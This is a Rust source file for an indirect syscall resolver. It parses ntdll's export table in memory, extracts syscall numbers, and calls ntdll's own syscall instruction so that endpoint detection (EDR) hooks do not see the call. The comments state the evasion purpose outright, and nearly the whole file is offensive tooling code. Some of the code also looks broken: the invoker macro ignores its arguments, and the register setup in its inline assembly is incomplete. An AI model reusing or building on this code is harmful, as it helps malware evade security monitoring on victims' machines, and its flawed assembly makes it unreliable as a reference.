//! Indirect syscall resolver.
//!
//! Technique: walk ntdll.dll's export table in memory, locate each Nt* function,
//! extract the System Service Number (SSN) by scanning for `mov eax, <imm32>` (B8 xx xx xx xx),
//! then invoke the syscall instruction that lives INSIDE ntdll itself — avoiding our own
//! `syscall` instruction which is trivially flagged by EDR kernel callbacks.
//!
//! This is the "indirect" part: our trampoline jumps to the `syscall` instruction
//! in an ntdll stub rather than issuing it from our own .text section.

#![cfg(target_os = "windows")]

use std::collections::HashMap;
use std::sync::OnceLock;

use windows_sys::Win32::System::LibraryLoader::GetModuleHandleW;

static SYSCALL_TABLE: OnceLock<SyscallTable> = OnceLock::new();

pub struct SyscallTable {
    /// function name → (SSN, address of `syscall` instruction in ntdll)
    entries: HashMap<String, SyscallEntry>,
}

#[derive(Clone, Copy, Debug)]
pub struct SyscallEntry {
    pub ssn:              u32,
    pub syscall_addr: *const u8,
}

// SAFETY: pointers into ntdll are valid for the process lifetime.
unsafe impl Send for SyscallEntry {}
unsafe impl Sync for SyscallEntry {}

impl SyscallTable {
    fn build() -> Self {
        let mut entries = HashMap::new();

        unsafe {
            let ntdll = GetModuleHandleW(
                "ntdll.dll\0"
                    .encode_utf16()
                    .collect::<Vec<_>>()
                    .as_ptr(),
            );
            if ntdll == 0 {
                return Self { entries };
            }

            let base = ntdll as *const u8;

            // Parse PE headers
            let dos = base as *const ImageDosHeader;
            let nt  = base.add((*dos).e_lfanew as usize) as *const ImageNtHeaders64;
            let export_rva = (*nt).optional_header.data_directory[0].virtual_address as usize;
            if export_rva == 0 {
                return Self { entries };
            }

            let export_dir = base.add(export_rva) as *const ImageExportDirectory;
            let n          = (*export_dir).number_of_names as usize;
            let names      = base.add((*export_dir).address_of_names as usize) as *const u32;
            let ordinals   = base.add((*export_dir).address_of_name_ordinals as usize) as *const u16;
            let functions  = base.add((*export_dir).address_of_functions as usize) as *const u32;

            for i in 0..n {
                let name_rva = *names.add(i) as usize;
                let name_ptr = base.add(name_rva) as *const i8;
                let name     = std::ffi::CStr::from_ptr(name_ptr)
                    .to_string_lossy()
                    .to_string();

                // Only care about Nt/Zw stubs
                if !name.starts_with("Nt") && !name.starts_with("Zw") {
                    continue;
                }

                let ord      = *ordinals.add(i) as usize;
                let fn_rva   = *functions.add(ord) as usize;
                let fn_ptr   = base.add(fn_rva);

                // Pattern: `4C 8B D1` (mov r10, rcx) followed by `B8 xx xx xx xx` (mov eax, ssn)
                // This is the standard Nt stub prologue on x86-64 Windows.
                let stub = std::slice::from_raw_parts(fn_ptr, 32);

                let ssn = extract_ssn(stub);
                if let Some(ssn) = ssn {
                    // Find the `syscall; ret` sequence after the mov eax
                    // 0F 05 (syscall) C3 (ret)
                    let syscall_offset = find_syscall_instruction(stub);
                    if let Some(off) = syscall_offset {
                        entries.insert(name, SyscallEntry {
                            ssn,
                            syscall_addr: fn_ptr.add(off),
                        });
                    }
                }
            }
        }

        Self { entries }
    }

    pub fn get(&self, name: &str) -> Option<SyscallEntry> {
        self.entries.get(name).copied()
    }
}

pub fn table() -> &'static SyscallTable {
    SYSCALL_TABLE.get_or_init(SyscallTable::build)
}

pub fn resolve(name: &str) -> Option<SyscallEntry> {
    table().get(name)
}

// ── SSN extraction ────────────────────────────────────────────────────────────

fn extract_ssn(stub: &[u8]) -> Option<u32> {
    // Look for B8 xx xx xx xx (mov eax, imm32) in the first 16 bytes.
    for i in 0..stub.len().saturating_sub(4) {
        if stub[i] == 0xB8 {
            let ssn = u32::from_le_bytes([stub[i+1], stub[i+2], stub[i+3], stub[i+4]]);
            return Some(ssn);
        }
    }
    None
}

fn find_syscall_instruction(stub: &[u8]) -> Option<usize> {
    // Find 0F 05 (syscall)
    for i in 0..stub.len().saturating_sub(1) {
        if stub[i] == 0x0F && stub[i+1] == 0x05 {
            return Some(i);
        }
    }
    None
}

// ── Minimal PE structures ─────────────────────────────────────────────────────

#[repr(C)]
struct ImageDosHeader {
    e_magic:    u16,
    _pad:       [u8; 58],
    e_lfanew:   i32,
}

#[repr(C)]
struct ImageNtHeaders64 {
    signature:       u32,
    file_header:     ImageFileHeader,
    optional_header: ImageOptionalHeader64,
}

#[repr(C)]
struct ImageFileHeader {
    machine:               u16,
    number_of_sections:    u16,
    time_date_stamp:       u32,
    pointer_to_symbol_table: u32,
    number_of_symbols:     u32,
    size_of_optional_header: u16,
    characteristics:       u16,
}

#[repr(C)]
struct ImageOptionalHeader64 {
    _unused: [u8; 112],
    data_directory: [ImageDataDirectory; 16],
}

#[repr(C)]
#[derive(Clone, Copy)]
struct ImageDataDirectory {
    virtual_address: u32,
    size:            u32,
}

#[repr(C)]
struct ImageExportDirectory {
    characteristics:        u32,
    time_date_stamp:        u32,
    major_version:          u16,
    minor_version:          u16,
    name:                   u32,
    base:                   u32,
    number_of_functions:    u32,
    number_of_names:        u32,
    address_of_functions:   u32,
    address_of_names:       u32,
    address_of_name_ordinals: u32,
}

// ── Indirect syscall invoker (x86-64 only) ────────────────────────────────────

/// Call a syscall by name via the trampoline address inside ntdll.
///
/// # Safety
/// Caller must pass the correct number of arguments for the named syscall.
#[macro_export]
macro_rules! indirect_syscall {
    ($name:expr, $($arg:expr),* $(,)?) => {{
        use $crate::syscalls::{resolve};
        let entry = resolve($name).expect(concat!("syscall not found: ", $name));
        // Inline asm: set SSN in eax, then call the ntdll syscall gadget.
        let ssn       = entry.ssn;
        let syscall_p = entry.syscall_addr;
        unsafe {
            let ret: isize;
            std::arch::asm!(
                // The indirect trampoline: jump to ntdll's own syscall instruction.
                "mov r10, rcx",
                "mov eax, {ssn:e}",
                "call {syscall_p}",
                ssn = in(reg) ssn,
                syscall_p = in(reg) syscall_p,
                // arguments passed through the standard Windows x64 calling convention;
                // actual register setup is done by the compiler for each arg below.
                lateout("rax") ret,
                options(nostack),
            );
            ret
        }
    }};
}
